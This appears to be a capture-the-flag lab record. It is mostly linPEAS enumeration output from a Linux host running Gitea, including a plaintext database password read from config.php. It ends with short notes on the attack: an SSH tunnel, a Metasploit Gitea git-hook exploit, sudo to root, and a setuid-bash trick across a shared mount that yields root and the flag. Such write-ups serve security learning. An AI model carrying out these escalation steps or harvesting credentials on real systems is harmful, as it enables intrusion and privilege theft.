â•”â•â•â•â•â•â•â•â•â•â•â•£ Modified interesting files in the last 5mins (limit 100)
/gitea/gitea/log/gitea.log
/gitea/git/.ssh/authorized_keys
/var/log/journal/c5eba9e424b54f969ee60335c12df3c7/user-1000.journal
/var/log/journal/c5eba9e424b54f969ee60335c12df3c7/system.journal

logrotate 3.11.0

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files inside /home/cookie-monster (limit 20)
total 960
drwxr-xr-x 5 cookie-monster cookie-monster   4096 Nov  5 12:00 .
drwxr-xr-x 3 root           root             4096 Dec 10  2021 ..
lrwxrwxrwx 1 cookie-monster cookie-monster      9 Sep  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cookie-monster cookie-monster    220 Sep  3  2020 .bash_logout
-rw-r--r-- 1 cookie-monster cookie-monster   3771 Sep  3  2020 .bashrc
drwx------ 2 cookie-monster cookie-monster   4096 Sep  3  2020 .cache
-rw-rw-r-- 1 cookie-monster cookie-monster     62 Dec 10  2021 .gitconfig
drwx------ 3 cookie-monster cookie-monster   4096 Nov  5 12:02 .gnupg
lrwxrwxrwx 1 root           root                9 Sep  3  2020 .mysql_history -> /dev/null
-rw-r--r-- 1 cookie-monster cookie-monster    807 Sep  3  2020 .profile
drwx------ 2 cookie-monster cookie-monster   4096 Dec 10  2021 .ssh
-rw-r--r-- 1 cookie-monster cookie-monster  85179 Dec 10  2021 cookie_analysis
-rwxr-xr-x 1 cookie-monster cookie-monster 853290 Nov  4 17:56 linpeas.sh
-r-------- 1 cookie-monster cookie-monster     24 Nov 12  2022 user.txt

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files inside others home (limit 20)
/var/www/html/assets/fonts/DancingScript-Regular.otf
/var/www/html/assets/fonts/Alegreya-Regular.otf
/var/www/html/assets/css/style.css
/var/www/html/assets/css/alegreya.css
/var/www/html/assets/css/dancing.css
/var/www/html/assets/img/flag.jpg
/var/www/html/assets/img/patience.mp4
/var/www/html/test7.txt
/var/www/html/config.php
/var/www/html/index.php

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching installed mail applications

â•”â•â•â•â•â•â•â•â•â•â•â•£ Mails (limit 50)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Backup files (limited 100)
-rw-r--r-- 1 cookie-monster cookie-monster 16 Nov  5 11:58 /gitea/gitea/queues/pr_patch_checker/CURRENT.bak
-rw-r--r-- 1 cookie-monster cookie-monster 16 Nov  5 11:58 /gitea/gitea/queues/notification-service/CURRENT.bak
-rw-r--r-- 1 cookie-monster cookie-monster 16 Nov  5 11:58 /gitea/gitea/queues/repo_stats_update/CURRENT.bak
-rw-r--r-- 1 cookie-monster cookie-monster 16 Nov  5 11:58 /gitea/gitea/queues/task/CURRENT.bak
-rw-r--r-- 1 cookie-monster cookie-monster 16 Nov  5 11:58 /gitea/gitea/indexers/issues.queue/CURRENT.bak
-rw-r--r-- 1 root root 9081 Apr 14  2021 /lib/modules/4.15.0-143-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Apr 14  2021 /lib/modules/4.15.0-143-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9080 Oct 27  2022 /lib/modules/4.15.0-196-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8880 Oct 27  2022 /lib/modules/4.15.0-196-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 11755 Nov 12  2022 /usr/share/info/dir.old
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1391 Nov 12  2022 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 35544 Aug 16  2022 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 217592 Oct 27  2022 /usr/src/linux-headers-4.15.0-196-generic/.config.old
-rw-r--r-- 1 root root 0 Oct 27  2022 /usr/src/linux-headers-4.15.0-196-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Oct 27  2022 /usr/src/linux-headers-4.15.0-196-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217425 Apr 14  2021 /usr/src/linux-headers-4.15.0-143-generic/.config.old
-rw-r--r-- 1 root root 0 Apr 14  2021 /usr/src/linux-headers-4.15.0-143-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Apr 14  2021 /usr/src/linux-headers-4.15.0-143-generic/include/config/net/team/mode/activebackup.h

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


â•”â•â•â•â•â•â•â•â•â•â•â•£ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root     root     4.0K Sep  3  2020 .
drwxr-xr-x 13 root     root     4.0K Sep  3  2020 ..
drwxrwxrwx  3 www-data www-data 4.0K Nov  5 11:59 html

/var/www/html:
total 20K
drwxrwxrwx 3 www-data www-data 4.0K Nov  5 11:59 .
drwxr-xr-x 3 root     root     4.0K Sep  3  2020 ..

â•”â•â•â•â•â•â•â•â•â•â•â•£ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Sep  3  2020 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Apr 26  2018 /etc/.pwd.lock
-rw-r--r-- 1 cookie-monster cookie-monster 220 Sep  3  2020 /home/cookie-monster/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Sep  3  2020 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 0 Nov  5 11:57 /run/ubuntu-fan/.lock

â•”â•â•â•â•â•â•â•â•â•â•â•£ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in history files

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files
/var/www/html/config.php:	$password = "Cda3RsDJga";

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking for TTY (sudo/su) passwords in audit logs

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords inside logs (limit 70)
 Argon2 is a password-hashing function that can be used to hash passwords
2022-11-12 19:23:37 status half-configured passwd:amd64 1:4.5-1ubuntu2
2022-11-12 19:23:37 status half-installed passwd:amd64 1:4.5-1ubuntu2
2022-11-12 19:23:37 status unpacked passwd:amd64 1:4.5-1ubuntu2
2022-11-12 19:23:37 upgrade passwd:amd64 1:4.5-1ubuntu2 1:4.5-1ubuntu2.3
2022-11-12 19:23:38 configure passwd:amd64 1:4.5-1ubuntu2.3 <none>
2022-11-12 19:23:38 status half-configured passwd:amd64 1:4.5-1ubuntu2.3
2022-11-12 19:23:38 status half-installed passwd:amd64 1:4.5-1ubuntu2
2022-11-12 19:23:38 status unpacked passwd:amd64 1:4.5-1ubuntu2.3
2022-11-12 19:23:39 status installed passwd:amd64 1:4.5-1ubuntu2.3
Binary file /var/log/installer/initial-status.gz matches
Binary file /var/log/journal/c5eba9e424b54f969ee60335c12df3c7/user-1000.journal matches
Description: Set up users and passwords



                                â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ API Keys Regex â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                                â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Regexes to search for API keys aren't activated, use param '-r' 

ssh -L 3001:localhost:3000 cookie-monster@10.10.129.196

metasploit use rcs git hook gitea

got a shell as git sudo -l : all perms => sudo su

shared directory /data/gitea and /gitea/gitea

on the first machine :

cp /bin/bash 

on the second : 

chown root:root bash

chmod +s bash

on the first :

./bash -p

got a root shell

cat /root/root.txt : EPI{C_1s_f0R_C00K135_tH4T_S_G00d_3n0UgH_F0r_M3}
